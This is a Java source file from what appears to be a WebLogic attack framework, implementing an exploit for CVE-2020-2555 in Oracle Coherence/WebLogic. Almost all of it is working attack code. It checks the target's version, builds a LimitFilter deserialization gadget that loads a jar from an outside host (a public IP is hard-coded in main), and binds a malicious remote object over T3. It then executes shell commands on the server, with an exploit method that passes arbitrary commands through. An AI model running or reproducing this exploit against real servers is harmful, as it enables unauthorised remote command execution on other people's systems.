/*
 * Copyright  2020.  r4v3zn
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *  http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

package com.weblogic.framework.payloads.impl;

import cn.hutool.core.io.IORuntimeException;
import cn.hutool.http.HttpUtil;
import com.weblogic.framework.annotation.Authors;
import com.weblogic.framework.annotation.Dependencies;
import com.weblogic.framework.annotation.Tags;
import com.weblogic.framework.annotation.Versions;
import com.weblogic.framework.entity.ContextPojo;
import com.weblogic.framework.entity.MyException;
import com.weblogic.framework.gadget.ObjectPayload;
import com.weblogic.framework.gadget.impl.LimitFilterGadget;
import com.weblogic.framework.payloads.VulTest;
import com.weblogic.framework.utils.VulUtils;
import javassist.ClassPool;
import javassist.CtClass;
import weblogic.cluster.singleton.ClusterMasterRemote;
import javax.naming.Context;
import java.io.Serializable;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.Remote;
import static com.weblogic.framework.config.CharsetConfig.defaultCharsetName;
import static com.weblogic.framework.utils.CallUtils.CALL_MAP;
import static com.weblogic.framework.utils.CallUtils.callExec;
import static com.weblogic.framework.utils.ClassLoaderUtils.loadJar;
import static com.weblogic.framework.utils.ContextUtils.rebind;
import static com.weblogic.framework.utils.StringUtils.getRandomString;
import static com.weblogic.framework.utils.UrlUtils.checkUrl;
import static com.weblogic.framework.utils.VersionUtils.checkVersion;
import static com.weblogic.framework.utils.VersionUtils.getVersion;

/**
 * Title: CVE_2020_2555
 * Desc:
 * <p>
 *     CVE-2020-2555
 *     Oracle Fusion中间件Oracle Coherence存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取Weblogic服务器权限，执行任意命令。
 *     该漏洞主要是因为 com.tangosol.util.filter.LimitFilter#toString 触发。
 *     漏洞影响版本:
 *     Oracle Coherence 3.7.1.17
 *     Oracle Coherence & Weblogic 12.1.3.0.0
 *     Oracle Coherence & Weblogic 12.2.1.3.0
 *     Oracle Coherence & Weblogic 12.2.1.4.0
 *     github: https://github.com/0nise/CVE-2020-2555
 *     paper: https://www.r4v3zn.com/posts/975312a1/
 * </p>
 * Date:2020/3/31 21:31
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":LimitFilter"})
@Versions({"12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
@Tags({"Nday"})
public class CVE_2020_2555 implements VulTest{


    /**
     * 漏洞利用 jar 文件名称
     */
    public static final String[] DEPENDENCIES = new String[]{"coherence.jar"};

    /**
     * 漏洞影响版本
     */
    public static final String[] VUL_VERSIONS = new String[]{"12.1.3.0", "12.1.3.0.0", "12.2.1.3.0", "12.2.1.3.0.0", "12.2.1.4.0", "12.2.1.4.0.0"};

    /**
     * remote
     */
    private Object remote = null;

    /**
     * bindName
     */
    private String bindName = "";

    /**
     * current context
     */
    private Context currentContext = null;

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param url host
     * @param param 执行参数
     * @return
     * @throws Exception
     */
    public Boolean vulnerable(String url, String... param) throws Exception {
        url = checkUrl(url);
        URL checkURL = new URL(url);
        String ip = checkURL.getHost();
        Integer port = checkURL.getPort() == -1 ? checkURL.getDefaultPort():checkURL.getPort();
        String protocol = checkURL.getProtocol();
        String ldapProtocol = "t3";
        if("https".equals(protocol)){
            ldapProtocol = "t3s";
        }
        String version = getVersion(ip, port);
        version = version.replace(".0.0",".0");
        Boolean flag = checkVersion(version, VUL_VERSIONS);
        if(!flag){
            return false;
        }
        if(!version.contains("12.1.3.0") && param.length == 0){
            throw new MyException("please set your javascript file url!");
        }
        URLClassLoader urlClassLoader = null;
        try{
            urlClassLoader = loadJar(version, DEPENDENCIES);
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
        String javascriptUrl = "";
        if(param.length == 0 || version.contains("12.1.3.0")){
            javascriptUrl = "";
        }else{
            javascriptUrl = param[0];
            try{
                String rsp = HttpUtil.get(javascriptUrl, 5);
                if(!rsp.contains("org/mozilla/javascript/regexp/") && !rsp.contains("org/mozilla/javascript/tools/resources")){
                    throw new MyException("无法访问 javascript 文件,请配置正确的路径!");
                }
            }catch (Exception e){
                if(e instanceof IORuntimeException){
                    throw new MyException("无法访问 javascript 文件,请配置正确的路径!");
                }else{
                    throw new MyException("无法访问 javascript 文件,请配置正确的路径!");
                }
            }
        }
        String charsetName = "";
        String callName = ClusterMasterRemote.class.getSimpleName();
        if(param.length > 3){
            charsetName = param[2];
            callName = param[3];
        }
        if(charsetName == null){
            charsetName = defaultCharsetName;
        }
        Class<? extends Remote> callClazz = CALL_MAP.get(callName);
        ObjectPayload<Serializable> objectPayload = new LimitFilterGadget();
        bindName = getRandomString(16);
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass =  pool.get(callClazz.getName());
        if(ctClass.isFrozen()){
            ctClass.defrost();
        }
        ctClass.setName(callClazz.getSimpleName());
        byte[] bytes = ctClass.toBytecode();
        ctClass.defrost();
        Object object = objectPayload.getObject(bytes,new String[]{bindName, javascriptUrl}, callClazz.getSimpleName(), urlClassLoader);
        String jndiUrl = String.format(ldapProtocol+"://%s:%s", ip, port);
        ContextPojo contextPojo = null;
        try{
            contextPojo = rebind(jndiUrl, object, urlClassLoader);
        }catch (Exception e){
            e.printStackTrace();
        }
        if(contextPojo == null || contextPojo.getContext() == null || contextPojo.getUrlClassLoader() == null){
            return false;
        }
        Context context = contextPojo.getContext();
        System.out.println("[*] bind name --> "+bindName+" ok !");
        try{
            Object objectCall = context.lookup(bindName);
            this.currentContext = context;
            this.remote = objectCall;
            String cmd = "echo a136d86442181f45a4446f5fb8a49f7f";
            cmd += "@@"+charsetName+"####"+ip+":"+port;
            String rsp = callExec(cmd,objectCall);
            return rsp.contains("a136d86442181f45a4446f5fb8a49f7f");
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }finally {
            System.gc();
            urlClassLoader.close();
        }
    }

    /**
     * 漏洞利用
     *
     * @param url
     * @param param
     * @throws Exception 抛出异常
     */
    @Override
    public String exploit(String url, String... param) throws Exception {
        return VulUtils.exploit(url, remote, param);
    }

    public static void main(String[] args) throws Exception {
        String url = "http://192.168.1.6:8080/com.bea.javascript.jar";
//        url = "http://192.168.1.3:9999/com.bea.javascript.jar";
        url = "http://45.32.23.211:8080/com.bea.javascript.jar";
        CVE_2020_2555 vul = new CVE_2020_2555();
//        vul.vulnerable("10.10.10.173", 7001, url);
//        System.out.println(vul.exploit(null,null,"calc"));
    }
}
